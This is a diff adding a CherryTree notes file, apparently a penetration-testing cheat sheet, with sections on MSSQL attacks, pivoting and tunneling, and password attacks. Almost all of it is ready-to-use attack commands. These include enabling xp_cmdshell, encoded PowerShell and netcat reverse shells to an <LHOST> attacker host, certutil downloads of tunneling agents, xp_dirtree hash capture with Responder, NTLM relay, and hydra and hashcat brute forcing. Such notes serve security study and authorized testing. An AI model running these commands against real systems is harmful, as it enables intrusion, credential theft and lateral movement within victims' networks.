@@ -1,0 +1,234 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Offensive Security" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+    <rich_text></rich_text>
+
+    <node name="06. MSSQL Attacks &amp; Lateral Movement" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Connection &amp; Enumeration" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>mssqlclient.py corp.local/sa@&lt;TARGET_IP&gt; -windows-auth
+# Connect to remote SQL instance using Windows domain tokens
+--------------------------------------------------
+mssqlclient.py sa@&lt;TARGET_IP&gt;
+# Connect to remote SQL instance using native SQL accounts
+--------------------------------------------------
+sqlcmd -S &lt;TARGET_IP&gt; -U sa -P password -Q "SELECT @@version"
+# Local endpoint inline structural Transact-SQL connection
+--------------------------------------------------
+. .\PowerUpSQL.ps1; Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+# Automated domain-wide SQL engine authentication capability mapping
+--------------------------------------------------
+SELECT @@version; SELECT SYSTEM_USER; SELECT USER_NAME(); SELECT IS_SRVROLEMEMBER('sysadmin');
+# Enumerate instance details, active user properties, and sysadmin status
+--------------------------------------------------
+SELECT name FROM master.dbo.sysdatabases;
+# Enumerate all local databases within the instance
+--------------------------------------------------
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+# Check if active account holds explicit impersonation privileges
+--------------------------------------------------
+EXEC sp_linkedservers;
+# Identify linked database infrastructure parameters across networks
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="xp_cmdshell &amp; Impersonation" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+# Enable xp_cmdshell for operating system command injection
+--------------------------------------------------
+EXEC xp_cmdshell 'whoami';
+# Execute system administrative queries via the shell primitive
+--------------------------------------------------
+EXEC xp_cmdshell 'powershell -nop -w hidden -enc &lt;BASE64_PAYLOAD&gt;';
+# Spawn a reverse shell connection via inline base64 PowerShell payload
+--------------------------------------------------
+EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://&lt;LHOST&gt;/nc.exe -OutFile C:\Windows\Temp\nc.exe"';
+EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe &lt;LHOST&gt; 4444 -e cmd';
+# Download and execute netcat for reverse shell via xp_cmdshell
+--------------------------------------------------
+EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');
+# Impersonation Attack: Switch session authorization context to 'sa'
+--------------------------------------------------
+REVERT;
+# Drop the elevated context token to restore default session settings
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Linked Servers &amp; UNC Injection" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>SELECT * FROM OPENQUERY("MS02\SQLEXPRESS", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+# Linked Server: Submit open queries to verify system user settings
+--------------------------------------------------
+EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
+# Linked Server: Execute operating system commands remotely across the link
+--------------------------------------------------
+EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];
+# Linked Server: Execute nested command strings across multiple database hops
+--------------------------------------------------
+sudo responder -I tun0 -v
+# Prepare inbound network share traffic capturing engines
+--------------------------------------------------
+EXEC xp_dirtree '\\&lt;LHOST&gt;\share';
+# Force remote database engines outbound access to attacker mounts (Hash Capture)
+--------------------------------------------------
+hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt
+# Run decryption attacks against captured NetNTLMv2 network exchanges
+--------------------------------------------------
+sudo python3 ntlmrelayx.py -t smb://&lt;TARGET_IP&gt; -smb2support
+# Deploy in-network NTLM relay authentication hijacking servers
+--------------------------------------------------
+BULK INSERT ##tempcsv FROM 'C:\Windows\System32\drivers\etc\hosts' WITH (ROWTERMINATOR = '\n', FIELDTERMINATOR = ','); SELECT * FROM ##tempcsv;
+# Read internal files from disk and store text contents into temporary tables
+--------------------------------------------------</rich_text>
+      </node>
+    </node>
+
+    <node name="07. Pivoting &amp; Tunneling" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Ligolo-ng" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+# Setup local tunnel interface and start proxy listener
+--------------------------------------------------
+python3 -m http.server 80
+# Host agent binaries for download
+--------------------------------------------------
+certutil -urlcache -split -f http://&lt;LHOST&gt;/agent.exe agent.exe
+.\agent.exe -connect &lt;LHOST&gt;:11601 -ignore-cert
+# Download and run agent on Windows target
+--------------------------------------------------
+./agent -connect &lt;LHOST&gt;:11601 -ignore-cert
+# Run agent on Linux target
+--------------------------------------------------
+session
+ifconfig
+start
+# Ligolo console: select session, map interfaces, start tunnel
+--------------------------------------------------
+sudo ip route add 10.10.10.0/24 dev ligolo
+# Route internal subnet through Ligolo tunnel
+--------------------------------------------------
+listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp
+# Expose isolated internal target port back to attacker workspace
+--------------------------------------------------
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+.\agent.exe -connect &lt;MS01_IP&gt;:11601 -ignore-cert
+sudo ip route add 172.16.0.0/24 dev ligolo
+# Establish nested multi-hop forwarding vectors over secondary subnets
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Chisel" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>./chisel server -p 8888 --reverse
+# Start Chisel server in reverse mode
+--------------------------------------------------
+.\chisel.exe client &lt;LHOST&gt;:8888 R:socks
+# Establish reverse SOCKS tunnel from Windows target
+--------------------------------------------------
+proxychains nmap -sT -Pn 10.10.10.50
+proxychains crackmapexec smb 10.10.10.50 -u user -p pass
+# Scan internal target via proxychains
+--------------------------------------------------
+.\chisel.exe client &lt;LHOST&gt;:8888 R:3306:127.0.0.1:3306
+# Forward specific isolated internal node port to attacker loopback
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="SSH Tunneling &amp; Plink" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>ssh -L 3389:10.10.10.50:3389 user@&lt;MS01_IP&gt;
+# Local port forward for RDP access
+--------------------------------------------------
+xfreerdp /v:localhost:3389 /u:user /p:pass
+# Connect to forwarded RDP port
+--------------------------------------------------
+ssh -D 1080 -N user@&lt;MS01_IP&gt;
+proxychains nmap -sT -Pn 10.10.10.0/24
+# Dynamic SOCKS proxy tunnel for full subnet scanning
+--------------------------------------------------
+ssh -R 4444:127.0.0.1:4444 attacker@&lt;LHOST&gt;
+ssh -R 445:127.0.0.1:445 attacker@&lt;LHOST&gt;
+# Reverse port forward from Windows target to attacker
+--------------------------------------------------
+certutil -urlcache -split -f http://&lt;LHOST&gt;/plink.exe plink.exe
+cmd /c echo y | .\plink.exe -ssh -l root -pw &lt;SSH_PASS&gt; -R 127.0.0.1:4455:127.0.0.1:445 &lt;LHOST&gt;
+# Download and run Plink for non-interactive automated reverse SSH tunneling
+--------------------------------------------------</rich_text>
+      </node>
+    </node>
+
+    <node name="08. Password Attacks" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+      <rich_text></rich_text>
+
+      <node name="Hash Identification &amp; Hashcat" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>hashid &lt;HASH&gt;
+# Identify hash algorithm type and Hashcat mode
+--------------------------------------------------
+hashcat -m 1000 ntlm.txt rockyou.txt --force -O -w 4
+# Crack NTLM hashes
+--------------------------------------------------
+hashcat -m 5600 netntlm.txt rockyou.txt --force -O -w 4
+# Crack NetNTLMv2 hashes (Responder captures)
+--------------------------------------------------
+hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O -w 4
+# Crack Kerberoast TGS tickets
+--------------------------------------------------
+hashcat -m 18200 asrep.txt rockyou.txt --force -O -w 4
+# Crack AS-REP Roast tickets
+--------------------------------------------------
+hashcat -m 1800 shadow.txt rockyou.txt --force -O -w 4
+# Crack SHA512crypt Linux shadow hashes ($6$)
+--------------------------------------------------
+hashcat -m 500 shadow.txt rockyou.txt --force -O -w 4
+# Crack MD5crypt Linux shadow hashes ($1$)
+--------------------------------------------------
+hashcat -m 22000 hashcat.hc22000 rockyou.txt --force -O -w 4
+# Crack WPA-PBKDF2-PMKID+EAPOL wireless handshakes
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="Custom Wordlists &amp; Brute Force" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>cewl http://&lt;TARGET_IP&gt; -m 5 -d 3 -w cewl.txt
+# Spider target website to generate contextual wordlist
+--------------------------------------------------
+hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule &gt; mutated.txt
+# Mutate base wordlist using Hashcat rules
+--------------------------------------------------
+hydra -l root -P rockyou.txt ssh://&lt;TARGET_IP&gt; -t 4 -V
+# SSH brute force
+--------------------------------------------------
+hydra -l admin -P rockyou.txt &lt;TARGET_IP&gt; http-post-form "/login.php:username=^USER^&amp;password=^PASS^:Invalid"
+# HTTP POST form brute force
+--------------------------------------------------
+crowbar -b rdp -s &lt;TARGET_IP&gt;/32 -u administrator -C rockyou.txt
+# RDP brute force
+--------------------------------------------------
+netexec smb &lt;TARGET_IP&gt; -u users.txt -p passwords.txt --no-bruteforce
+netexec winrm &lt;TARGET_IP&gt; -u users.txt -p passwords.txt
+# Wide subnet credential sprays targeting SMB and WinRM
+--------------------------------------------------</rich_text>
+      </node>
+
+      <node name="NTLM Capture &amp; Relay" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
+        <rich_text>sudo responder -I tun0 -dwv
+# Capture NetBIOS, LLMNR, and MDNS broadcast hashes
+--------------------------------------------------
+hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt
+# Crack captured Responder hashes
+--------------------------------------------------
+netexec smb &lt;SUBNET&gt;/24 --gen-relay-list unsigned.txt
+# Find hosts with SMB signing disabled for relay
+--------------------------------------------------
+sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support
+# Relay captured hashes to targets automatically
+--------------------------------------------------
+sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support -i
+nc 127.0.0.1 &lt;RELAY_PORT&gt;
+# Start relay engine in interactive mode for manual shell interception
+--------------------------------------------------</rich_text>
+      </node>
+    </node>
+
+  </node>
+</cherrytree>
